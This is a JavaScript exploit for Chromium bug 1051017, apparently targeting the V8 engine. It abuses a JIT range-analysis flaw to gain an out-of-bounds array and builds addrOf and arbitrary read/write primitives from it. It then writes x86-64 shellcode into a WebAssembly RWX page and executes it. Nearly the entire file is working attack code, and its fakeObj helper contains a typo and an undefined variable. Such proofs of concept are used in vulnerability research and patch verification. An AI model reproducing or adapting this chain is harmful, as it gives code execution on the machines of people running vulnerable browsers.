/*

exploit for crbug_1051017

*/

// tookits
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
var uint32 = new Uint32Array(buf);
// Floating point to 64-bit unsigned integer
function f2i(f)
{
    float64[0] = f;
    return bigUint64[0];
}
// 64-bit unsigned integer to Floating point
function i2f(i)
{
    bigUint64[0] = i;
    return float64[0];
}

function f2half(val)
{
    float64[0]= val;
    let tmp = Array.from(uint32);
    return tmp;
}

function half2f(val)
{
    uint32.set(val);
    return float64[0];
}
// 64-bit unsigned integer to hex
function hex(i)
{
    return "0x"+i.toString(16).padStart(16, "0");
}

let maxSize = 0x1000 * 4;

// pwn
let leak_obj;
let big_uint_array;
let obj = {};

function trigger() {
    var x = -Infinity;
    var k = 0;
    for (var i = 0; i < 1; i += x) {
        if (i == -Infinity) {
          x = +Infinity;
        }
  
        if (++k > 10) {
          break;
        }
    }
  
    var value = Math.max(i, 1024);
    value = -value;
    value = Math.max(value, -1025);
    value = -value;
    value -= 1022;
    value >>= 1; // *** 3 ***
    value += 10; //
  
    let oob_array = Array(value);

    oob_array[0] = 1.1;
    return [oob_array, {}];
  };
  
  for (let i = 0; i < 20000; ++i) {
    trigger();
  }
  
//   console.log(trigger()[0][11]);
let oob_array = trigger()[0];

let padding = [1];
padding.length = 11;

leak_obj = {m:0xdead, n:obj}; 
big_uint_array = new BigUint64Array(6);
big_uint_array[0] = 0x1234n;
big_uint_array[1] = 0x4567n;

// %DebugPrint(oob_array);
// %DebugPrint(leak_obj);
// %DebugPrint(big_uint_array);

if(oob_array.length > 10){
    print("[+] oob array successed");
    print("[+] oob array length : " + hex(oob_array.length));
}else{
    throw "oob failed";
}

// print("hang for attach");
// while(1){
//     ;
// }


var floatArrayBigLenIdx = 0;
var floatArrayBigBaseIdx = 0;
var floatArrayBigExternalIdx = 0;

for(let i=0; i<maxSize; ++i) {
    if(f2i(oob_array[i]) == 0x1234) {

        floatArrayBigBaseIdx = i + 12;
        floatArrayBigExternalIdx = i + 11;
        floatArrayBigLenIdx = i+10;
        console.log("[+] float idx of big uint array base addr is: "+hex(floatArrayBigBaseIdx));
        console.log("[+] float idx of big uint array external addr is: "+hex(floatArrayBigExternalIdx));
        break;
    }
}

var bigUintArrayLen = f2i(oob_array[floatArrayBigLenIdx]);
var bigUintArrayBasePtr = f2i(oob_array[floatArrayBigBaseIdx]);
var bigUintArrayExternalPtr = f2i(oob_array[floatArrayBigExternalIdx]);

print("[+] bigUintArrayLen : " + hex(bigUintArrayLen));
print("[+] bigUintArrayBasePtr : " + hex(bigUintArrayBasePtr));
print("[+] bigUintArrayExternalPtr : " + hex(bigUintArrayExternalPtr));

var compressHeapHighAddr = BigInt(bigUintArrayExternalPtr) & 0xffffffff00000000n;
print("[+] compressHeapHighAddr : " + hex(compressHeapHighAddr));

function addrOf(obj){
    leak_obj.n = obj;
    for(let i=0; i<maxSize; i++) {
        let half = f2half(oob_array[i]);
        if( half[0] == (0xdead<<1) ) {
            ret = half[1];
            break;
        }
        else if( half[1] == (0xdead<<1) ) {
            ret = f2half(oob_array[i+1])[0];
            break;
        }
    }

    return BigInt(ret);
}

function fakeObj(addr){
    for(let i=0; i<maxSize; i++) {
        let half = f2half(oob_array[i]);
        if(half[0] == (oxdead<<1)) {
            half[1] = addr;
            oob_array[i] = half2f(half);
            return objArray.n;
        }
        else if(half[1] == (0xdead<<1)) {
            half = f2half(oob_array[i+1]);
            half[0] = addr;
            oob_array[i+1] = half2f(half);
            return objArray.n;
        }
    } 
}


function read64(addr){
    oob_array[floatArrayBigBaseIdx] = i2f(addr-0x8n);
    let ret = big_uint_array[0];
    oob_array[floatArrayBigBaseIdx] = i2f(bigUintArrayBasePtr);
    return ret;

}

function write64(addr, val){
    // print(hex(addr));
    oob_array[floatArrayBigExternalIdx] = i2f(addr);
    oob_array[floatArrayBigBaseIdx] = i2f(0n);
    // print(hex(f2i(oob_array[floatArrayBigExternalIdx]) + f2i(oob_array[floatArrayBigBaseIdx])));
    big_uint_array[0] = val;
    oob_array[floatArrayBigExternalIdx] = i2f(bigUintArrayExternalPtr);
    oob_array[floatArrayBigBaseIdx] = i2f(bigUintArrayBasePtr);
    return;
}

function ByteToBigIntArray(payload){

    let sc = []
    let tmp = 0n;
    let lenInt = BigInt(Math.floor(payload.length/8))
    for (let i = 0n; i < lenInt; i += 1n) {
        tmp = 0n;
        for(let j=0n; j<8n; j++){
            tmp += BigInt(payload[i*8n+j])*(0x1n<<(8n*j));
        }
        sc.push(tmp);
    }

    let len = payload.length%8;
    tmp = 0n;
    for(let i=0n; i<len; i++){
        tmp += BigInt(payload[lenInt*8n+i])*(0x1n<<(8n*i));
    }
    sc.push(tmp);
    return sc;
}


function ArbitratyWrite(addr, payload){

    sc = ByteToBigIntArray(payload);

    oob_array[floatArrayBigLenIdx] = i2f(BigInt(sc.length));
    oob_array[floatArrayBigBaseIdx] = i2f(0n);
    oob_array[floatArrayBigExternalIdx] = i2f(addr);
    for(let i = 0; i<sc.length; i+=1) {
        big_uint_array[i] = sc[i];
    }

    oob_array[floatArrayBigLenIdx] = bigUintArrayLen;
    oob_array[floatArrayBigBaseIdx] = bigUintArrayBasePtr;
    oob_array[floatArrayBigExternalIdx] = bigUintArrayExternalPtr;
}




var wasmCode = new Uint8Array([0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1,
127, 3, 130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131, 128, 128, 128, 0,
1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128, 128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2,
0, 4, 109, 97, 105, 110, 0, 0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 10, 11]);
var wasmModule = new WebAssembly.Module(wasmCode);
var wasmInstance = new WebAssembly.Instance(wasmModule, {});
var func = wasmInstance.exports.main;

// %DebugPrint(func);

let wasm_func_addr = addrOf(func) + compressHeapHighAddr;
print("[+] wasm func addr : " + hex(wasm_func_addr));
let shared_info_addr = read64(wasm_func_addr + 0xcn) & 0xffffffffn;
print("[+] shared info : " + hex(shared_info_addr + compressHeapHighAddr));
let wasm_export_func_addr = read64(shared_info_addr + compressHeapHighAddr + 0x4n) & 0xffffffffn;
print("[+] wasm_export_func_addr : " + hex(wasm_export_func_addr + compressHeapHighAddr));
let instance_addr = read64(wasm_export_func_addr + compressHeapHighAddr + 8n) & 0xffffffffn;
print("[+] instance_addr : " + hex(instance_addr + compressHeapHighAddr));
let rwx_addr = read64(instance_addr + compressHeapHighAddr + 0x68n);
print("[+] rwx_addr : " + hex(rwx_addr));


// write64(rwx_addr + 0x0n, 0xccccccccccccccccn); // just for test, wirte is ok, exec is ok;
// write64(rwx_addr + 0x8n, 0x10101010101b848n);
// write64(rwx_addr + 0x10n, 0x62792eb848500101n);
// write64(rwx_addr + 0x18n, 0x431480101626d60n);
// write64(rwx_addr + 0x20n, 0x2f7273752fb84824n);
// write64(rwx_addr + 0x28n, 0x68e78948506e6962n);
// write64(rwx_addr + 0x30n, 0x12434810101313bn);
// write64(rwx_addr + 0x38n, 0x534944b848010101n);
// write64(rwx_addr + 0x40n, 0xd231503d59414c50n);
// write64(rwx_addr + 0x48n, 0x52e201485a086a52n);
// write64(rwx_addr + 0x50n, 0x10101b848e28948n); // crash at write this
// write64(rwx_addr + 0x58n, 0xb848500101010101n);
// write64(rwx_addr + 0x60n, 0x10101626d606279n);
// write64(rwx_addr + 0x68n, 0x6a56f63124043148n);
// write64(rwx_addr + 0x70n, 0x894856e601485e08n);
// write64(rwx_addr + 0x78n, 0x50f583b6ae6n);

var shellcode = [72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72, 184, 46, 121, 98,
    96, 109, 98, 1, 1, 72, 49, 4, 36, 72, 184, 47, 117, 115, 114, 47, 98,
    105, 110, 80, 72, 137, 231, 104, 59, 49, 1, 1, 129, 52, 36, 1, 1, 1, 1,
    72, 184, 68, 73, 83, 80, 76, 65, 89, 61, 80, 49, 210, 82, 106, 8, 90,
    72, 1, 226, 82, 72, 137, 226, 72, 184, 1, 1, 1, 1, 1, 1, 1, 1, 80, 72,
    184, 121, 98, 96, 109, 98, 1, 1, 1, 72, 49, 4, 36, 49, 246, 86, 106, 8,
    94, 72, 1, 230, 86, 72, 137, 230, 106, 59, 88, 15, 5];
ArbitratyWrite(rwx_addr, shellcode);

func();